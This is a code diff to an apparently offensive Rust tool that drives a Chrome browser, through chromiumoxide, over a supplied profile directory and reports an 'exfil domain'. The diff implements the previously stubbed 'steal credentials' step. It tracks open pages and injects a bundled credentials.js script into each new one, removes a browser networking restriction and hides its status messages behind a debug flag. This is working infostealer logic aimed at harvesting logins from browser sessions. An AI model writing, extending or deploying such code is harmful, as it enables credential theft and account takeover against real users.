@@ -1,5 +1,14 @@
-use chromiumoxide::browser::{Browser, BrowserConfig};
-use std::path::PathBuf;
+use chromiumoxide::{
+    browser::{Browser, BrowserConfig},
+    cdp::browser_protocol::{
+        page::AddScriptToEvaluateOnNewDocumentParams,
+        target::TargetId
+    }
+};
+use std::{
+    path::PathBuf,
+    collections::HashSet
+};
 use futures::StreamExt;
 use tokio::time::{sleep, Duration};
 
@@ -9,7 +18,6 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
             .with_head()
             .arg("--start-maximized")
             .arg("--no-startup-window")
-            .arg("--disable-background-networking")
             .user_data_dir(&junc_path)
             .viewport(None)
             .disable_default_args()
@@ -36,8 +44,11 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
         println!("[*] Using exfil domain: {}", exfil_domain);
     }
 
+    // Lookup table to keep track of pages already injected.
+    let mut injected_pages: HashSet<TargetId> = HashSet::new();
 
-    // Monitor pages
+    #[cfg(feature = "debug")]
+    println!("[*] Monitoring pages...");
     loop {
         let pages = browser.pages().await?;
 
@@ -46,7 +57,34 @@ pub async fn run_browser(junc_path: &PathBuf) -> Result<bool, Box<dyn std::error
             break;
         }
 
-        // Inject javascript to steal credentials
+        // A temporary set to keep track of the pages found in the current iteration.
+        let mut current_pages = HashSet::new();
+
+        // For each page
+        for page in pages {
+            let page_id = page.target_id().clone();
+            current_pages.insert(page_id.clone());
+
+            // Check if we have already injected the script into this page.
+            if !injected_pages.contains(&page_id) {
+                #[cfg(feature = "debug")]
+                println!("[*] New page detected");
+
+                #[cfg(feature = "debug")]
+                println!("[*] Injecting JS into page with ID: {:?}", page_id);
+                page.execute(
+                    AddScriptToEvaluateOnNewDocumentParams::builder()
+                    .source(include_str!("js/credentials.js"))
+                    .build()?,
+                )
+                .await?;
+
+                injected_pages.insert(page_id);
+            }
+        }
+
+        // Remove IDs of pages that are now closed.
+        injected_pages.retain(|page_id| current_pages.contains(page_id));
 
 
         // Wait for a second before checking again
